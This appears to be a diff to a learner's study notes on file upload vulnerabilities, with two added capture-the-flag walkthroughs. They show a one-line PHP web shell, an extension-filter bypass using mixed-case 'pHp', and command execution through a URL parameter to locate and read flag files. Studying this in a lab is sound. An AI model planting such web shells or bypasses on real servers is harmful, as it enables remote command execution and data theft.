@@ -10,7 +10,7 @@
 #  Cause - When a file is uploaded, it doesn't check or authenticate
 #  Location - Any upload location (Chekcing through burp suite)
 
-# 3. Attack scenarios
+# 3. File upload vulnerability - Attack scenarios
 #  - Unlimited = DoS Attack, Web Shell, Malware script, Back door, Ransomware
 #  1) Execution files on server side
 #    * Server-side script vs client-side script (XSS)
@@ -27,16 +27,13 @@
 #  - Web Shell
 #  - php web shell
 <?php echo system$_GET['cmd']; ?>
+
 # 5. Keypoint of Web Shell Attack
 #  1. Possibility of uploading web server code
 #  2. Path of the uploaded file
 #    * Path Check
 #      - Checking the output of the uploaded file
 #      - Copy image address
-
-------------------------------------------------------------------------------------------------------------------------------------
-
-# 5. CTF - Webshell
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
@@ -57,7 +54,45 @@
 #  6. Caution when finding vulnerabilities in file upload
 #    - Why using web shell = checking the execution of the upload file
 
+------------------------------------------------------------------------------------------------------------------------------------
 
+# CTF - Webshell 1
+#  Error - php file upload on the board and find flag.txt
+#  - Create a new hacking php file to upload
+#    = <?php echo system($_GET['cmd']); ?>
+#  - Create a new post and upload the hacking php file
+#  - Look at the post package through the burp suite and check the possibility
+#  - Copy the download link address on the new post
+#  - Check the link operation on the search bar with any command
+#    = http://ctf.segfaulthub.com:8989/webshell_1/files/seungho/webshell.php?cmd=ls
+#  - Try different commend through the burp suite package repeater
+#  - Try attack commend to find the flag
+#    = find / -name flag.txt 2>/dev/null
+#    = find%20%2F%20-name%20flag.txt%202%3E%2Fdev%2Fnull
+#  - When finding the path, read the file
+#    = cat /app/webshell_1/important_data/flag.txt
+#    = cat%20/app/webshell_1/important_data/flag.txt
 
-
-
+# CTF - Webshell 2
+#  Error - find flag.txt file in the server
+#  - Create a new hacking php file to upload
+#  - Create a new post and upload the hacking php file
+#  - Found an alert of the extension limitation
+#  - Upload any image file to get a successful upload package
+#  - On the package, change the file name to webshell.php and attack content to add a "webshell.php" attack file
+#    = <?php echo system($_GET['cmd']); ?>
+#  - Try to replace the extension such as a capital combination (e.g. php -> pHp) to create a new post
+#  - Look at the post package through the burp suite and check the confirmation
+#  - Find a new post to get the download link address
+#  - Copy the download link address on the new post
+#  - Check the list of uploaded files
+#    = http://ctf.segfaulthub.com:7979/webshell_2/files/seungho/
+#  - Check the link operation on the search bar with any command
+#    = http://ctf.segfaulthub.com:8989/webshell_1/files/seungho/webshell.php?cmd=ls
+#  - Try different commend through the burp suite package repeater
+#  - Try attack command to find the flag
+#    = find / -name flag.txt 2>/dev/null
+#    = find%20%2F%20-name%20flag.txt%202%3E%2Fdev%2Fnull
+#  - When finding the path, read the file
+#    = cat /app/webshell_2/secret_file/flag.txt
+#    = cat%20app/webshell_2/secret_file/flag.txt
